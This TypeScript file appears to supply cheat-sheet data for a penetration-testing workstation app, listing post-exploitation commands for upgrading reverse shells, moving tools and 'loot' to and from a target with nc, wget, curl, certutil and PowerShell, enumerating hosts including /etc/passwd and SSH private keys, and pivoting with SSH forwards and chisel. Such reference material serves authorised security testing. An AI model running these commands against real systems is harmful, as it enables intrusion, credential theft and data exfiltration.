import type { WorkstationItem } from "../types";

/**
 * Situational cheat-sheets: the things you reach for the moment you land a shell.
 */

const ttyUpgrade: WorkstationItem = {
  id: "tty-upgrade",
  name: "TTY Upgrade",
  category: "Cheat-sheets",
  summary: "Turn a dumb reverse shell into a fully interactive terminal.",
  kind: "snippets",
  snippets: [
    { id: "python", label: "1. Spawn PTY (python3)", command: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", explain: "Upgrades to a pseudo-terminal." },
    { id: "python2", label: "1. Spawn PTY (python)", command: "python -c 'import pty; pty.spawn(\"/bin/bash\")'" },
    { id: "script", label: "1. Spawn PTY (script)", command: "script -qc /bin/bash /dev/null", explain: "When python is unavailable." },
    { id: "bg", label: "2. Background shell", command: "export TERM=xterm", explain: "Then press Ctrl+Z to background it." },
    { id: "stty", label: "3. Raw mode (run locally)", command: "stty raw -echo; fg", explain: "Run in YOUR terminal after Ctrl+Z, then press Enter twice." },
    { id: "resize", label: "4. Fix size", command: "stty rows 38 columns 116", explain: "Match your terminal dimensions." },
    {
      id: "rlwrap",
      group: "Listeners with a real PTY",
      label: "rlwrap listener",
      command: "rlwrap nc -lvnp {LPORT}",
      explain: "Catch your next shell with rlwrap — instant arrow keys and history, no upgrade dance needed.",
      newTab: true,
    },
    {
      id: "socat-listen",
      label: "socat full-PTY listener",
      command: "socat FILE:`tty`,RAW,ECHO=0 TCP-LISTEN:{LPORT}",
      explain: "Pair with the socat reverse shell payload for a fully interactive session straight away.",
      newTab: true,
    },
  ],
};

const fileTransfer: WorkstationItem = {
  id: "file-transfer",
  name: "File Transfer",
  category: "Cheat-sheets",
  summary: "Move tools and loot between your box and the target.",
  kind: "snippets",
  snippets: [
    { id: "http-server", label: "Serve cwd (python3)", command: "python3 -m http.server {FILEPORT}", explain: "Host files from your box. Files are then at http://{LHOST}:{FILEPORT}/{FILE}.", newTab: true },
    { id: "wget", label: "Download (wget)", command: "wget http://{LHOST}:{FILEPORT}/{FILE} -O /tmp/{FILE}" },
    { id: "curl", label: "Download (curl)", command: "curl http://{LHOST}:{FILEPORT}/{FILE} -o /tmp/{FILE}" },
    { id: "certutil", label: "Download (Windows certutil)", command: "certutil -urlcache -f http://{LHOST}:{FILEPORT}/{FILE} {FILE}" },
    { id: "ps-download", label: "Download (PowerShell)", command: "powershell -c \"Invoke-WebRequest -Uri http://{LHOST}:{FILEPORT}/{FILE} -OutFile {FILE}\"" },
    { id: "nc-send", label: "Send with nc (receiver)", command: "nc -lvnp {FILEPORT} > {FILE}", newTab: true },
    { id: "nc-recv", label: "Send with nc (sender)", command: "nc {LHOST} {FILEPORT} < {FILE}" },
    { id: "scp", label: "SCP", command: "scp {FILE} {USER}@{RHOST}:/tmp/{FILE}" },
    { id: "b64-enc", label: "Base64 encode (source)", command: "base64 -w0 {FILE}", explain: "Copy the output, then decode on the target." },
    { id: "b64-dec", label: "Base64 decode (target)", command: "echo <base64> | base64 -d > {FILE}", runnable: false },
  ],
};

const enumeration: WorkstationItem = {
  id: "enumeration",
  name: "Host Enumeration",
  category: "Cheat-sheets",
  summary: "First-look enumeration once you have any foothold.",
  kind: "snippets",
  snippets: [
    { id: "os", label: "OS / kernel", command: "uname -a; cat /etc/os-release 2>/dev/null" },
    { id: "users", label: "Users with shells", command: "grep -vE 'nologin|false' /etc/passwd" },
    { id: "network", label: "Network config", command: "ip a; ip route; cat /etc/hosts" },
    { id: "listening", label: "Listening services", command: "ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null" },
    { id: "arp", label: "Neighbours (ARP)", command: "ip neigh; arp -a 2>/dev/null" },
    { id: "mounts", label: "Mounts / fstab", command: "mount; cat /etc/fstab" },
    { id: "interesting", label: "Config files", command: "find / -name '*.conf' -o -name '*.config' 2>/dev/null | head -n 50" },
    { id: "keys", label: "SSH keys", command: "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null" },
  ],
};

const pivoting: WorkstationItem = {
  id: "pivoting",
  name: "Pivoting & Tunnels",
  category: "Cheat-sheets",
  summary: "Reach internal networks through a compromised host.",
  kind: "snippets",
  snippets: [
    { id: "ssh-local", label: "SSH local forward", command: "ssh -L {LPORT}:127.0.0.1:{RPORT} {USER}@{RHOST}", explain: "Expose a target-internal port on your box." },
    { id: "ssh-dynamic", label: "SSH dynamic (SOCKS)", command: "ssh -D {LPORT} {USER}@{RHOST}", explain: "Then set proxychains to socks5 127.0.0.1 {LPORT}." },
    { id: "ssh-remote", label: "SSH remote forward", command: "ssh -R {LPORT}:127.0.0.1:{RPORT} {USER}@{LHOST}" },
    { id: "chisel-server", label: "chisel server (your box)", command: "chisel server -p {LPORT} --reverse", newTab: true },
    { id: "chisel-client", label: "chisel client (target)", command: "chisel client {LHOST}:{LPORT} R:socks" },
  ],
};

export const CHEATSHEETS: WorkstationItem[] = [ttyUpgrade, fileTransfer, enumeration, pivoting];
